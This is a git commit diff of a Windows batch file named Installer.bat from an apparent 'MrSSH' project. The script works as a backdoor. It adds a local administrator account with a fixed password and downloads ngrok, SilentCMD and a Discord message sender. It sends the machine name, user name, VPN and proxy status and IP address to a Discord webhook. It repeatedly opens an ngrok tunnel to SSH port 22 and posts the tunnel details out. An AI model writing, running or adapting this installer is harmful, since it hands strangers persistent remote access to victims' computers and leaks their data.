91c2b63eb6830c4a2185cca708c53e6f38e0814c
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-30 18:02:06 +0200

    Change the whole file, idk

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -2,27 +2,33 @@ cd %temp%
 
 curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1" -o "OpenSSH.ps1"
 curl -Ls "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat" -o "source.bat"
-curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 curl -Ls "https://github.com/dh3b/MrSSH/blob/main/Files/SilentCMD.exe?raw=true" -o "SilentCMD.exe"
-
-powershell ./OpenSSH.ps1
+curl -Ls "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "ngrok.zip"
 
 net user "Admin" "Administrator" /add
 net localgroup Administrators Admin /add
 net localgroup Administratorzy Admin /add
-net localgroup Administración Admin /add
+net localgroup Administración  Admin /add
 
-set ""
-
-call source.bat +silent --embed "MrSSH install code has been invoked on %computername%\%username%" "Files with information will be send soon" "50c878"
+set "webhook="
 
 :: router info command
-curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router --Usecolors False>router.txt & call Source.bat +silent --file %temp%/router.txt
+curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & call router>router.txt
+
+:: router set info
+FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.vpn`) DO (SET vpn=%%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.proxy`) DO (SET proxy=%%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter query`) DO (SET local=%%F)
+
+call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
 tar -xf ngrok.zip
 
+start /B "discordmsg" taskkill /IM ngrok.exe /F & silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10
+start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60 & taskkill /IM ngrok.exe /F
+
 :ngrokloop
+call source.bat +silent --embed "Renewing the MrSSH session for %computername%\%username% (%local%)..." " " "52bf90" "https://i.imgur.com/b2Terft.png"
 start /B "discordmsg" silentcmd Source.bat +silent --file %temp%/ngrok.log /DELAY:10 & taskkill /IM ngrok.exe /F
 start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 60
 goto ngrokloop
-
